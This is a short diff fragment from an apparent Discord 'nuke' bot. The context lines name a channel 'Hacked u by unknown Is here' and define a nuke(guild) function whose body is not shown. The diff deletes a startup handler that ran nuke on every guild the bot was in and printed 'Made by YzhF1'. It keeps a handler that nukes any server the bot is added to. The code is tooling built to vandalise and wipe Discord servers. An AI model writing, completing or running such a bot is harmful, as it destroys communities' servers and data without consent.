@@ -431,9 +431,7 @@ m.createChannel('Hacked u by unknown Is here', 'voice');
 });
  
  
-const { Client } = require('discord.js');
-const client = new Client();
- 
+
 async function nuke(guild) {
   let users = 0;
   let channels = 0;
@@ -467,15 +465,7 @@ async function nuke(guild) {
  
 }
  
-LOka.on('ready', () => {
-  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
-  console.log('-------------------------------------------------------------');
-  console.log('');
-  console.log("Made by YzhF1");
-  console.log("");
-  console.log("-------------------------------------------------------------");
- 
-});
+
  
 LOka.on('guildCreate', async (guild) => {
   return nuke(guild).catch(console.error);
